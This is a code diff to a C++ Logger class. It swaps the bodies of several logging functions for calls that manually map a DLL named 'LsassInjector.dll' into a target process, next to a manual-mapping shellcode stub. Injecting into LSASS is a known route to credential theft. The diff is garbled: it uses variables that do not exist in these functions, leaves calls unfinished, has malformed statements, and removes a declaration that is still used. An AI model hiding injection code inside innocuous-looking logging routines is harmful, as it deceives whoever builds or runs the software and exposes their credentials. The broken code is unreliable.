@@ -40,8 +40,8 @@ string Logger::LogString(string explaination, const string str)
 float Logger::LogFloat(string explaination, const float value)
 {
 	if (DoLog && logText) {
-		string logme = "Log_Float : " + explaination + " ! " + tostr<float>(value) + "\r\n";
-		WriteFile(logText, logme.c_str(), logme.size(), NULL, NULL);
+		Result = ManualMap(hProc, "C:\\Users\\Hunter\\Documents\\Visual Studio 2017\\Projects\\LsassInjector\\x64\\Debug\\LsassInjector.dll",
+		argv[argc - 3], &dllparam, (DWORD)atoi(argv[argc - 1]));
 	}
 	return value;
 }
@@ -49,8 +49,8 @@ float Logger::LogFloat(string explaination, const float value)
 int Logger::LogInt(string explaination, const int value)
 {
 	if (DoLog && logText) {
-		string logme = "Log_Int : " + explaination + " ! " + tostr<int>(value) + "\r\n" ;
-		WriteFile(logText, logme.c_str(), logme.size(), NULL, NULL);
+		cout << "Injecting..." << endl;
+		Result = ManualMap(hProc, "C:\\Users\\Hunter\\Documents\\Visual Studio 2017\\Projects\\LsassInjector\\x64\\Debug\\LsassInjector.dll",
 	}
 	return value;
 }
@@ -91,7 +91,7 @@ void __stdcall Shellcode(MANUAL_MAPPING_DATA * pData)
 	auto _RtlAddFunctionTable = pData->pRtlAddFunctionTable;
 	auto _DllMain = reinterpret_cast<f_DLL_ENTRY_POINT>(pBase + pOpt->AddressOfEntryPoint);
 
-	BYTE * LocationDelta = pBase - pOpt->ImageBase;
+	cout << argv[argc - 2] << "    --INJECTED INTO->    " << dllparam.TargetProcessName << endl;
 	if (LocationDelta)
 	{
 		if (!pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
@@ -155,7 +155,7 @@ BYTE Logger::LogBYTE(string explaination, const BYTE value)
 		cout << "Can not get a HANDLE of the prcoess" << endl;
 		WriteFile(logText, logme.c_str(), logme.size(), NULL, NULL);
 	}
-	return value;
+	Injecting = false; / logger.LogString("Injection Finished"); 
 }
 
 DWORD64 Logger::LogAddress(string explaination, const DWORD64 value)
